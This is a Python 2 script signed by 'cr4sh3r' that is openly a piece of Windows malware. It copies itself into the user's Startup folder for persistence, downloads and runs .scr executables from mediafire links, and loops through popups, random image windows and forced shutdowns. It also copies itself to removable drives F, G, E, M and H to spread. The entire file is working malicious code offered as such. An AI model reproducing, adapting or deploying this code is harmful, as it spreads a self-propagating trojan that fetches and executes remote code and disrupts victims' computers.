#! python2
# Made by cr4sh3r
# uh3u3hu3h3u

import wget, time, os, random, getpass, winsound, ctypes, urllib, base64
from Tkinter import *


def checkex():

    global ft
    cd = os.getcwd()
    quest = getpass.getuser()
    startxa = "C:\Users"  + "\\" + quest + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    start = "\"C:\Users"  + "\\" + quest + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\""
    global filen
    filen = "\"" + sys.argv[0] + "\""

    if cd == startxa:
        ft = False
        payloads()

    else:
        ft = True
        startupcom = "copy " +  filen + " " + start
        os.system(startupcom)
        time.sleep(5)
        dn()

def dn():
    # Necessary files

    wget.download("http://download1499.mediafire.com/4idbxxf5qpxg/3u2ps3idmsh3tgw/bambams.scr")
    os.system("move bambams.scr C:\\")
    time.sleep(1)

    wget.download("http://download1639.mediafire.com/8g6qmhu5ud2g/wbgvv3ba751hdis/jajas.scr")
    os.system("move jajas.scr C:\\")
    time.sleep(1)

    wget.download("http://download1496.mediafire.com/rnww1w81kzzg/14q3n14sqmh3kwn/xavs.scr")
    os.system("move xavs.scr C:\\")
    time.sleep(1)

    wget.download("http://download1324.mediafire.com/ty4c5lkbt8bg/4e26tz4lc3905ld/jcs.mp3")
    os.system("move jcs.mp3 C:\\")
    time.sleep(1)

    payloads()

def payloads():

    def jc():
        ctypes.windll.user32.MessageBoxA(0, "Guess who is back", "JC", 1)
        winsound.PlaySound("C:\jcs.mp3", winsound.SND_ALIAS)

    def scsa():
        csc0 = random.choice(['bambams.scr', 'jajas.scr','xavs.scr'])
        os.system("start C:\\" + csc0 + " /s")

    def poo():
        root = Tk()
        root.title("666")
        root.geometry("450x350+100+100")
        n1_v2 = random.choice(["http://i.imgur.com/itvNpzx.gif", "http://i.imgur.com/wHNp0Rp.gif", "http://i.imgur.com/KmXgdak.gif", "http://i.imgur.com/nzeIAYZ.gif", "http://i.imgur.com/seCwEkV.gif", "http://i.imgur.com/EPwPjpP.gif", "http://i.imgur.com/wFRYqlD.gif", "http://i.imgur.com/Li7Swkp.gif", "http://i.imgur.com/FvcyIC2.gif", "http://i.imgur.com/IYNPEIx.gif", "http://i.imgur.com/HeBcQpe.gif", "http://i.imgur.com/11A3xjH.gif", "http://i.imgur.com/kgQ72MW.gif", "http://i.imgur.com/15Zvi4w.gif", "http://i.imgur.com/oNV1PFv.gif", "http://i.imgur.com/JAbUzsA.gif", "http://i.imgur.com/IjrBSha.gif", "http://i.imgur.com/E4PTe4f.gif", "http://i.imgur.com/sc13tyh.jpg", "http://i.imgur.com/PGSolEL.gif"])
        URL = n1_v2
        a = urllib.urlopen(URL)
        raw_input = a.read()
        a.close()
        b = base64.encodestring(raw_input)
        image = PhotoImage(data=b)
        label = Label(image=image)
        label.pack()
        root.mainloop()

    def shut():
        time.sleep(1800)
        os.system("shutdown /s")

    while 1==1:
        pcho = random.choice([1,2,3,4])

        if pcho   == 1:
            jc()
        elif pcho == 2:
            scsa()
        elif pcho == 3:
            poo()
        elif pcho == 4:
            shut()

        for i in range(1):
            pcho = random.choice([1,2,3,4])

        dl = ['F','G','E','M','H']
        def cpy(driveLetter):
            if os.system("cd " + driveLetter + ":") == 0:
                os.system("copy " + filen + " " + driveLetter + ":\\")
            else:
                pass

        for d in range(5):
            cpy(dl[d])


checkex()



